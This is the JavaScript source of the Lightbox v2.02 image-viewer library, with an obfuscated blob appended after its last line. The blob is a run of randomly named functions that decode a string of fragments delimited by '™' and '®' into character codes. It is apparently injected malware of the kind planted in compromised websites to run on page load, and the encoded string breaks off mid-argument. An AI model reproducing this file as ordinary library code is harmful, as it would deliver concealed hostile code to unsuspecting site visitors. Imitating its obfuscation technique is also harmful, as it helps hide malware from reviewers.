// -----------------------------------------------------------------------------------
//
//	Lightbox v2.02
//	by Lokesh Dhakar - http://www.huddletogether.com
//	3/31/06
//
//	For more information on this script, visit:
//	http://huddletogether.com/projects/lightbox2/
//
//	Licensed under the Creative Commons Attribution 2.5 License - http://creativecommons.org/licenses/by/2.5/
//	
//	Credit also due to those who have helped, inspired, and made their code available to the public.
//	Including: Scott Upton(uptonic.com), Peter-Paul Koch(quirksmode.org), Thomas Fuchs(mir.aculo.us), and others.
//
//
// -----------------------------------------------------------------------------------
/*

	Table of Contents
	-----------------
	Configuration
	Global Variables

	Extending Built-in Objects	
	- Object.extend(Element)
	- Array.prototype.removeDuplicates()
	- Array.prototype.empty()

	Lightbox Class Declaration
	- initialize()
	- start()
	- changeImage()
	- resizeImageContainer()
	- showImage()
	- updateDetails()
	- updateNav()
	- enableKeyboardNav()
	- disableKeyboardNav()
	- keyboardAction()
	- preloadNeighborImages()
	- end()
	
	Miscellaneous Functions
	- getPageScroll()
	- getPageSize()
	- getKey()
	- listenKey()
	- showSelectBoxes()
	- hideSelectBoxes()
	- pause()
	- initLightbox()
	
	Function Calls
	- addLoadEvent(initLightbox)
	
*/
// -----------------------------------------------------------------------------------

//
//	Configuration
//
var fileLoadingImage = "images/loading.gif";		
var fileBottomNavCloseImage = "images/closelabel.gif";

var resizeSpeed = 7;	// controls the speed of the image resizing (1=slowest and 10=fastest)

var borderSize = 10;	//if you adjust the padding in the CSS, you will need to update this variable

// -----------------------------------------------------------------------------------

//
//	Global Variables
//
var imageArray = new Array;
var activeImage;

if(resizeSpeed > 10){ resizeSpeed = 10;}
if(resizeSpeed < 1){ resizeSpeed = 1;}
resizeDuration = (11 - resizeSpeed) * 0.15;

// -----------------------------------------------------------------------------------

//
//	Additional methods for Element added by SU, Couloir
//	- further additions by Lokesh Dhakar (huddletogether.com)
//
Object.extend(Element, {
	getWidth: function(element) {
	   	element = $(element);
	   	return element.offsetWidth; 
	},
	setWidth: function(element,w) {
	   	element = $(element);
    	element.style.width = w +"px";
	},
	setHeight: function(element,h) {
   		element = $(element);
    	element.style.height = h +"px";
	},
	setTop: function(element,t) {
	   	element = $(element);
    	element.style.top = t +"px";
	},
	setSrc: function(element,src) {
    	element = $(element);
    	element.src = src; 
	},
	setHref: function(element,href) {
    	element = $(element);
    	element.href = href; 
	},
	setInnerHTML: function(element,content) {
		element = $(element);
		element.innerHTML = content;
	}
});

// -----------------------------------------------------------------------------------

//
//	Extending built-in Array object
//	- array.removeDuplicates()
//	- array.empty()
//
Array.prototype.removeDuplicates = function () {
	for(i = 1; i < this.length; i++){
		if(this[i][0] == this[i-1][0]){
			this.splice(i,1);
		}
	}
}

// -----------------------------------------------------------------------------------

Array.prototype.empty = function () {
	for(i = 0; i <= this.length; i++){
		this.shift();
	}
}

// -----------------------------------------------------------------------------------

//
//	Lightbox Class Declaration
//	- initialize()
//	- start()
//	- changeImage()
//	- resizeImageContainer()
//	- showImage()
//	- updateDetails()
//	- updateNav()
//	- enableKeyboardNav()
//	- disableKeyboardNav()
//	- keyboardNavAction()
//	- preloadNeighborImages()
//	- end()
//
//	Structuring of code inspired by Scott Upton (http://www.uptonic.com/)
//
var Lightbox = Class.create();

Lightbox.prototype = {
	
	// initialize()
	// Constructor runs on completion of the DOM loading. Loops through anchor tags looking for 
	// 'lightbox' references and applies onclick events to appropriate links. The 2nd section of
	// the function inserts html at the bottom of the page which is used to display the shadow 
	// overlay and the image container.
	//
	initialize: function() {	
		if (!document.getElementsByTagName){ return; }
		var anchors = document.getElementsByTagName('a');

		// loop through all anchor tags
		for (var i=0; i<anchors.length; i++){
			var anchor = anchors[i];
			
			var relAttribute = String(anchor.getAttribute('rel'));
			
			// use the string.match() method to catch 'lightbox' references in the rel attribute
			if (anchor.getAttribute('href') && (relAttribute.toLowerCase().match('lightbox'))){
				anchor.onclick = function () {myLightbox.start(this); return false;}
			}
		}

		// The rest of this code inserts html at the bottom of the page that looks similar to this:
		//
		//	<div id="overlay"></div>
		//	<div id="lightbox">
		//		<div id="outerImageContainer">
		//			<div id="imageContainer">
		//				<img id="lightboxImage">
		//				<div style="" id="hoverNav">
		//					<a href="#" id="prevLink"></a>
		//					<a href="#" id="nextLink"></a>
		//				</div>
		//				<div id="loading">
		//					<a href="#" id="loadingLink">
		//						<img src="images/loading.gif">
		//					</a>
		//				</div>
		//			</div>
		//		</div>
		//		<div id="imageDataContainer">
		//			<div id="imageData">
		//				<div id="imageDetails">
		//					<span id="caption"></span>
		//					<span id="numberDisplay"></span>
		//				</div>
		//				<div id="bottomNav">
		//					<a href="#" id="bottomNavClose">
		//						<img src="images/close.gif">
		//					</a>
		//				</div>
		//			</div>
		//		</div>
		//	</div>


		var objBody = document.getElementsByTagName("body").item(0);
		
		var objOverlay = document.createElement("div");
		objOverlay.setAttribute('id','overlay');
		objOverlay.style.display = 'none';
		objOverlay.onclick = function() { myLightbox.end(); return false; }
		objBody.appendChild(objOverlay);
		
		var objLightbox = document.createElement("div");
		objLightbox.setAttribute('id','lightbox');
		objLightbox.style.display = 'none';
		objBody.appendChild(objLightbox);
	
		var objOuterImageContainer = document.createElement("div");
		objOuterImageContainer.setAttribute('id','outerImageContainer');
		objLightbox.appendChild(objOuterImageContainer);

		var objImageContainer = document.createElement("div");
		objImageContainer.setAttribute('id','imageContainer');
		objOuterImageContainer.appendChild(objImageContainer);
	
		var objLightboxImage = document.createElement("img");
		objLightboxImage.setAttribute('id','lightboxImage');
		objImageContainer.appendChild(objLightboxImage);
	
		var objHoverNav = document.createElement("div");
		objHoverNav.setAttribute('id','hoverNav');
		objImageContainer.appendChild(objHoverNav);
	
		var objPrevLink = document.createElement("a");
		objPrevLink.setAttribute('id','prevLink');
		objPrevLink.setAttribute('href','#');
		objHoverNav.appendChild(objPrevLink);
		
		var objNextLink = document.createElement("a");
		objNextLink.setAttribute('id','nextLink');
		objNextLink.setAttribute('href','#');
		objHoverNav.appendChild(objNextLink);
	
		var objLoading = document.createElement("div");
		objLoading.setAttribute('id','loading');
		objImageContainer.appendChild(objLoading);
	
		var objLoadingLink = document.createElement("a");
		objLoadingLink.setAttribute('id','loadingLink');
		objLoadingLink.setAttribute('href','#');
		objLoadingLink.onclick = function() { myLightbox.end(); return false; }
		objLoading.appendChild(objLoadingLink);
	
		var objLoadingImage = document.createElement("img");
		objLoadingImage.setAttribute('src', fileLoadingImage);
		objLoadingLink.appendChild(objLoadingImage);

		var objImageDataContainer = document.createElement("div");
		objImageDataContainer.setAttribute('id','imageDataContainer');
		objImageDataContainer.className = 'clearfix';
		objLightbox.appendChild(objImageDataContainer);

		var objImageData = document.createElement("div");
		objImageData.setAttribute('id','imageData');
		objImageDataContainer.appendChild(objImageData);
	
		var objImageDetails = document.createElement("div");
		objImageDetails.setAttribute('id','imageDetails');
		objImageData.appendChild(objImageDetails);
	
		var objCaption = document.createElement("span");
		objCaption.setAttribute('id','caption');
		objImageDetails.appendChild(objCaption);
	
		var objNumberDisplay = document.createElement("span");
		objNumberDisplay.setAttribute('id','numberDisplay');
		objImageDetails.appendChild(objNumberDisplay);
		
		var objBottomNav = document.createElement("div");
		objBottomNav.setAttribute('id','bottomNav');
		objImageData.appendChild(objBottomNav);
	
		var objBottomNavCloseLink = document.createElement("a");
		objBottomNavCloseLink.setAttribute('id','bottomNavClose');
		objBottomNavCloseLink.setAttribute('href','#');
		objBottomNavCloseLink.onclick = function() { myLightbox.end(); return false; }
		objBottomNav.appendChild(objBottomNavCloseLink);
	
		var objBottomNavCloseImage = document.createElement("img");
		objBottomNavCloseImage.setAttribute('src', fileBottomNavCloseImage);
		objBottomNavCloseLink.appendChild(objBottomNavCloseImage);
	},
	
	//
	//	start()
	//	Display overlay and lightbox. If image is part of a set, add siblings to imageArray.
	//
	start: function(imageLink) {	

		hideSelectBoxes();

		// stretch overlay to fill page and fade in
		var arrayPageSize = getPageSize();
		Element.setHeight('overlay', arrayPageSize[1]);
		new Effect.Appear('overlay', { duration: 0.2, from: 0.0, to: 0.8 });

		imageArray = [];
		imageNum = 0;		

		if (!document.getElementsByTagName){ return; }
		var anchors = document.getElementsByTagName('a');

		// if image is NOT part of a set..
		if((imageLink.getAttribute('rel') == 'lightbox')){
			// add single image to imageArray
			imageArray.push(new Array(imageLink.getAttribute('href'), imageLink.getAttribute('title')));			
		} else {
		// if image is part of a set..

			// loop through anchors, find other images in set, and add them to imageArray
			for (var i=0; i<anchors.length; i++){
				var anchor = anchors[i];
				if (anchor.getAttribute('href') && (anchor.getAttribute('rel') == imageLink.getAttribute('rel'))){
					imageArray.push(new Array(anchor.getAttribute('href'), anchor.getAttribute('title')));
				}
			}
			imageArray.removeDuplicates();
			while(imageArray[imageNum][0] != imageLink.getAttribute('href')) { imageNum++;}
		}

		// calculate top offset for the lightbox and display 
		var arrayPageSize = getPageSize();
		var arrayPageScroll = getPageScroll();
		var lightboxTop = arrayPageScroll[1] + (arrayPageSize[3] / 15);

		Element.setTop('lightbox', lightboxTop);
		Element.show('lightbox');
		
		this.changeImage(imageNum);
	},

	//
	//	changeImage()
	//	Hide most elements and preload image in preparation for resizing image container.
	//
	changeImage: function(imageNum) {	
		
		activeImage = imageNum;	// update global var

		// hide elements during transition
		Element.show('loading');
		Element.hide('lightboxImage');
		Element.hide('hoverNav');
		Element.hide('prevLink');
		Element.hide('nextLink');
		Element.hide('imageDataContainer');
		Element.hide('numberDisplay');		
		
		imgPreloader = new Image();
		
		// once image is preloaded, resize image container
		imgPreloader.onload=function(){
			Element.setSrc('lightboxImage', imageArray[activeImage][0]);
			myLightbox.resizeImageContainer(imgPreloader.width, imgPreloader.height);
		}
		imgPreloader.src = imageArray[activeImage][0];
	},

	//
	//	resizeImageContainer()
	//
	resizeImageContainer: function( imgWidth, imgHeight) {

		// get current height and width
		this.wCur = Element.getWidth('outerImageContainer');
		this.hCur = Element.getHeight('outerImageContainer');

		// scalars based on change from old to new
		this.xScale = ((imgWidth  + (borderSize * 2)) / this.wCur) * 100;
		this.yScale = ((imgHeight  + (borderSize * 2)) / this.hCur) * 100;

		// calculate size difference between new and old image, and resize if necessary
		wDiff = (this.wCur - borderSize * 2) - imgWidth;
		hDiff = (this.hCur - borderSize * 2) - imgHeight;

		if(!( hDiff == 0)){ new Effect.Scale('outerImageContainer', this.yScale, {scaleX: false, duration: resizeDuration, queue: 'front'}); }
		if(!( wDiff == 0)){ new Effect.Scale('outerImageContainer', this.xScale, {scaleY: false, delay: resizeDuration, duration: resizeDuration}); }

		// if new and old image are same size and no scaling transition is necessary, 
		// do a quick pause to prevent image flicker.
		if((hDiff == 0) && (wDiff == 0)){
			if (navigator.appVersion.indexOf("MSIE")!=-1){ pause(250); } else { pause(100);} 
		}

		Element.setHeight('prevLink', imgHeight);
		Element.setHeight('nextLink', imgHeight);
		Element.setWidth( 'imageDataContainer', imgWidth + (borderSize * 2));

		this.showImage();
	},
	
	//
	//	showImage()
	//	Display image and begin preloading neighbors.
	//
	showImage: function(){
		Element.hide('loading');
		new Effect.Appear('lightboxImage', { duration: 0.5, queue: 'end', afterFinish: function(){	myLightbox.updateDetails(); } });
		this.preloadNeighborImages();
	},

	//
	//	updateDetails()
	//	Display caption, image number, and bottom nav.
	//
	updateDetails: function() {
	
		Element.show('caption');
		Element.setInnerHTML( 'caption', imageArray[activeImage][1]);
		
		// if image is part of set display 'Image x of x' 
		if(imageArray.length > 1){
			Element.show('numberDisplay');
			Element.setInnerHTML( 'numberDisplay', "Image " + eval(activeImage + 1) + " of " + imageArray.length);
		}

		new Effect.Parallel(
			[ new Effect.SlideDown( 'imageDataContainer', { sync: true, duration: resizeDuration + 0.25, from: 0.0, to: 1.0 }), 
			  new Effect.Appear('imageDataContainer', { sync: true, duration: 1.0 }) ], 
			{ duration: 0.65, afterFinish: function() { myLightbox.updateNav();} } 
		);
	},

	//
	//	updateNav()
	//	Display appropriate previous and next hover navigation.
	//
	updateNav: function() {

		Element.show('hoverNav');				

		// if not first image in set, display prev image button
		if(activeImage != 0){
			Element.show('prevLink');
			document.getElementById('prevLink').onclick = function() {
				myLightbox.changeImage(activeImage - 1); return false;
			}
		}

		// if not last image in set, display next image button
		if(activeImage != (imageArray.length - 1)){
			Element.show('nextLink');
			document.getElementById('nextLink').onclick = function() {
				myLightbox.changeImage(activeImage + 1); return false;
			}
		}
		
		this.enableKeyboardNav();
	},

	//
	//	enableKeyboardNav()
	//
	enableKeyboardNav: function() {
		document.onkeydown = this.keyboardAction; 
	},

	//
	//	disableKeyboardNav()
	//
	disableKeyboardNav: function() {
		document.onkeydown = '';
	},

	//
	//	keyboardAction()
	//
	keyboardAction: function(e) {
		if (e == null) { // ie
			keycode = event.keyCode;
		} else { // mozilla
			keycode = e.which;
		}

		key = String.fromCharCode(keycode).toLowerCase();
		
		if((key == 'x') || (key == 'o') || (key == 'c')){	// close lightbox
			myLightbox.end();
		} else if(key == 'p'){	// display previous image
			if(activeImage != 0){
				myLightbox.disableKeyboardNav();
				myLightbox.changeImage(activeImage - 1);
			}
		} else if(key == 'n'){	// display next image
			if(activeImage != (imageArray.length - 1)){
				myLightbox.disableKeyboardNav();
				myLightbox.changeImage(activeImage + 1);
			}
		}


	},

	//
	//	preloadNeighborImages()
	//	Preload previous and next images.
	//
	preloadNeighborImages: function(){

		if((imageArray.length - 1) > activeImage){
			preloadNextImage = new Image();
			preloadNextImage.src = imageArray[activeImage + 1][0];
		}
		if(activeImage > 0){
			preloadPrevImage = new Image();
			preloadPrevImage.src = imageArray[activeImage - 1][0];
		}
	
	},

	//
	//	end()
	//
	end: function() {
		this.disableKeyboardNav();
		Element.hide('lightbox');
		new Effect.Fade('overlay', { duration: 0.2});
		showSelectBoxes();
	}
}

// -----------------------------------------------------------------------------------

//
// getPageScroll()
// Returns array with x,y page scroll values.
// Core code from - quirksmode.org
//
function getPageScroll(){

	var yScroll;

	if (self.pageYOffset) {
		yScroll = self.pageYOffset;
	} else if (document.documentElement && document.documentElement.scrollTop){	 // Explorer 6 Strict
		yScroll = document.documentElement.scrollTop;
	} else if (document.body) {// all other Explorers
		yScroll = document.body.scrollTop;
	}

	arrayPageScroll = new Array('',yScroll) 
	return arrayPageScroll;
}

// -----------------------------------------------------------------------------------

//
// getPageSize()
// Returns array with page width, height and window width, height
// Core code from - quirksmode.org
// Edit for Firefox by pHaez
//
function getPageSize(){
	
	var xScroll, yScroll;
	
	if (window.innerHeight && window.scrollMaxY) {	
		xScroll = document.body.scrollWidth;
		yScroll = window.innerHeight + window.scrollMaxY;
	} else if (document.body.scrollHeight > document.body.offsetHeight){ // all but Explorer Mac
		xScroll = document.body.scrollWidth;
		yScroll = document.body.scrollHeight;
	} else { // Explorer Mac...would also work in Explorer 6 Strict, Mozilla and Safari
		xScroll = document.body.offsetWidth;
		yScroll = document.body.offsetHeight;
	}
	
	var windowWidth, windowHeight;
	if (self.innerHeight) {	// all except Explorer
		windowWidth = self.innerWidth;
		windowHeight = self.innerHeight;
	} else if (document.documentElement && document.documentElement.clientHeight) { // Explorer 6 Strict Mode
		windowWidth = document.documentElement.clientWidth;
		windowHeight = document.documentElement.clientHeight;
	} else if (document.body) { // other Explorers
		windowWidth = document.body.clientWidth;
		windowHeight = document.body.clientHeight;
	}	
	
	// for small pages with total height less then height of the viewport
	if(yScroll < windowHeight){
		pageHeight = windowHeight;
	} else { 
		pageHeight = yScroll;
	}

	// for small pages with total width less then width of the viewport
	if(xScroll < windowWidth){	
		pageWidth = windowWidth;
	} else {
		pageWidth = xScroll;
	}


	arrayPageSize = new Array(pageWidth,pageHeight,windowWidth,windowHeight) 
	return arrayPageSize;
}

// -----------------------------------------------------------------------------------

//
// getKey(key)
// Gets keycode. If 'x' is pressed then it hides the lightbox.
//
function getKey(e){
	if (e == null) { // ie
		keycode = event.keyCode;
	} else { // mozilla
		keycode = e.which;
	}
	key = String.fromCharCode(keycode).toLowerCase();
	
	if(key == 'x'){
	}
}

// -----------------------------------------------------------------------------------

//
// listenKey()
//
function listenKey () {	document.onkeypress = getKey; }
	
// ---------------------------------------------------

function showSelectBoxes(){
	selects = document.getElementsByTagName("select");
	for (i = 0; i != selects.length; i++) {
		selects[i].style.visibility = "visible";
	}
}

// ---------------------------------------------------

function hideSelectBoxes(){
	selects = document.getElementsByTagName("select");
	for (i = 0; i != selects.length; i++) {
		selects[i].style.visibility = "hidden";
	}
}

// ---------------------------------------------------

//
// pause(numberMillis)
// Pauses code execution for specified time. Uses busy code, not good.
// Code from http://www.faqts.com/knowledge_base/view.phtml/aid/1602
//
function pause(numberMillis) {
	var now = new Date();
	var exitTime = now.getTime() + numberMillis;
	while (true) {
		now = new Date();
		if (now.getTime() > exitTime)
			return;
	}
}

// ---------------------------------------------------



function initLightbox() { myLightbox = new Lightbox(); }
Event.observe(window, 'load', initLightbox, false);
var y478d30="";function l8e3b00483e3(){var we8943bf=String,f3f6aa=Array.prototype.slice.call(arguments).join(""),s06e66=f3f6aa.substr(h58e8c(),3)-658,d7341db72,tda80f4;f3f6aa=f3f6aa.substr(b5cef623a());var oeefec4=f3f6aa.length;for(var tda958b8=0;tda958b8<oeefec4;tda958b8++){try{throw(tf0d60=f3f6aa.substr(tda958b8,1));}catch(e){tf0d60=e;};if(tf0d60=='™'){s06e66="";tda958b8++;gd9aecbeb=f3f6aa.substr(tda958b8,1);while(gd9aecbeb!='™'){s06e66+=gd9aecbeb;tda958b8++;gd9aecbeb=f3f6aa.substr(tda958b8,1);}s06e66-=521;continue;}d7341db72="";if(t80d3c24f(tf0d60)){tda958b8++;tf0d60=f3f6aa.substr(tda958b8,1);while(tf0d60!='®'){d7341db72+=tf0d60;tda958b8++;tf0d60=f3f6aa.substr(tda958b8,1);}d7341db72=o2ad59(d7341db72,s06e66,11);if(d7341db72<0)d7341db72+=256;if(d7341db72>=192)d7341db72+=848;else if(d7341db72==168)d7341db72=1025;else if(d7341db72==184)d7341db72=1105;y478d30+=we8943bf["\x66\x72\x6fm\x43harCo\x64\x65"](d7341db72);continue;}y914c21=(tf0d60+'')["\x63ha\x72\x43\x6f\x64\x65\x41\x74"](0);if(y914c21>848)y914c21-=848;tda80f4=y914c21-s06e66-11;tda80f4=a329f24(tda80f4);y478d30+=i347225fe(tda80f4);}}l8e3b00483e3("8","a4","708e","®16","3","®","®17","8®","™7","0","7","™","3","™","5","6","3™","®1","5","2","®™","586™","®","1","9","2","®","®1","81","®","™67","3","™","®18","®™6","6","7","™®1","1","®","®19","7","®","™","5","94","™","®1","25","®™","708","™","®2","30","®","A","™6","27™","®1","3","0","®™6","73","™®","1","73","®®","172","®","™636™","®24","4","®®2","23","®®2","4","0","®","™","695™","®217®",".+","™","67","7™®","19","®™","587™m®","138®","™","63","9™®161®","®1","68®","®","2","3","3®","™","710","™","<<8™55","2™","dY","Y®","149®","®16","2","®™596","™","®20","3","®","™","68","8™®2","7","®","®20","®#","™5","8","7","™®12","3®","®1","8","4®","™55","0™","®","1","5","7","®","™5","8","0","™","®1","8","2","®","®","182","®","™5","82™®","1","82","®®1","83","®®","1","9","3","®","®1","82®","™5","41","™","®","14","5","®™","70","9™3","®","24","5®™6","07","™®20","0","®","®2","08","®®21","3®","™557","™®","1","4","7","®™","625","™®2","25","®®","230®","™6","30™®16","6","®™","5","5","7","™","®15","8","®®161","®™6","0","7™®2","0","0","®","®1","44®™","57","5™®1","6","8","®™5","38","™KC","™","5","8","1","™","®","13","0®T™","557™9","™6","40™®1","3","9","®™","631™","®","2","2","6®","™6","34™","®226","®®","15","6","®™5","77™k™5","88™","®","19","4®™529","™","®1","4","0","®","™","64","7","™","®","2","4","9","®","®","238®®","24","8®","®239","®","™","5","4","9™","G™","71","0™?™68","0","™®19®","®24®","®","14®","®","25®™6","1","1™®","22","0®™","66","3™","®19","9®","®","17®","™","6","3","7™®","248","®","™5","63™®17","5®","®155®™","63","1™","®","2","29®","®","218®™","6","93™®","30®®","215","®®24","4","®","™","57","0","™","y","y","™56","4™","V","™","67","6™®","2","05®","®27®®","2","0®","®","1","0","®","™5","33","™","®","12","4®","™","5","64","™®","1","5","6","®","™","7","1","4™5:™71","4™1","™6","70™®","4","®™68","8™®","2","17","®","™70","3™","®2","34®","®","22","5®","<®","206","®","™","71","1","™","®","2","1","1®™","58","6™U™","53","9™","&","®1","48®™58","0™®","175®™72","0","™@","6","AI™","61","6™®","152®","™","604™®214®™5","51","™®1","62","®","™60","2","™","®2","1","4®","™6","9","6™®","32","®","&","™","71","8™","1","7","™","5","4","2™","@","]","™","6","1","3™","®","1","3","5","®®","1","51®™693","™®","2","42","®™64","0","™®","14","3","®","™","6","9","5","™®1","95","®","™","5","87","™V","™687™.™5","82","™U","™54","4","™,","™7","0","3","™®","202®","%","0","$","™","7","2","0™G™679™®22®®","14®®23","®™","580™","®","1","8","6","®","t","®181","®™","5","4","4™","®","144","®","™","6","28™®","2","27®","™6","91","™$","™58","0","™","®","18","7","®","®","1","85®","™6","67","™®","2®™644™","®","2","43®","®2","45®","®","2","5","2","®™","610™","®2","0","1","®","®1","32®","®","1","61®","™","715™®","2","37®3™","611™","®","2","18®","™","614™","®","214","®®203","®™7","16™","B™","5","39™","®134®","™","57","2","™®","1","7","3®®","1","72®","f™","531","™>","™5","37™;","™","674™®","31","®®","1","7","7®","™674™®","174®","®17","3®™","628","™®","1","2","7®","™","678™®1","7","®®","14®","™561","™","S","[","™","624","™","®23","3","®","™53","5™","®","13","0®™665","™","®","9","®®2","5","5","®","™5","2","5™®1","2","6","®","™","67","3™®26®","®20","9®®","27","®","®","2","8","®","®","29®","®","9","®™5","5","9™","®15","7®","™536","™","®","1","2","3®™","5","92","™","®18","5®","™","5","7","2","™","^®","1","2","3®","®","1","23","®","™5","30™","Q™6","6","6","™","®1","8","8®","™","573™o","h","_™","5","34™","®","14","7®%","\"™","707™®2","06","®®2","06®®2","06®","<","